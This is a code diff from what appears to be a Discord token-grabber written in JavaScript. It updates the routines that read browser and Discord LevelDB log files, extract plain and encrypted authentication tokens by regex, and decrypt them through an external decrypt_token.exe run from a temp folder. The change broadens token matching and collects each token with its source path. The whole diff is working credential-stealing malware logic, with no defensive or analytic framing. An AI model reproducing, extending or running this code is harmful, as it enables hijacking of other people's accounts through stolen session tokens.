@@ -39,7 +39,9 @@ const decryptToken = (token, key) => execSync(
   join(tempFolder, 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
 ).toString('utf8');
 
-const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/;
+const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
+const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
+
 const decryptRickRoll = (path) => {
   return new Promise((resolve, reject) => {
     const encryptedTokens = [];
@@ -51,7 +53,10 @@ const decryptRickRoll = (path) => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
       const lines = readFileSync(join(levelDB, f), { encoding: 'utf-8', flag: 'r' }).split('\n').map(x => x.trim());
       lines.forEach(line => {
-        line.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi)?.map(token => {
+        line.match(tokenRegex)?.forEach(token => {
+          if (!tokens.includes(token)) tokens.push({ token, source: path.split('\\').pop() });
+        });
+        line.match(encryptedTokenRegex)?.forEach(token => {
           if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
           if (!encryptedTokens[token]) encryptedTokens.push(token);
         });
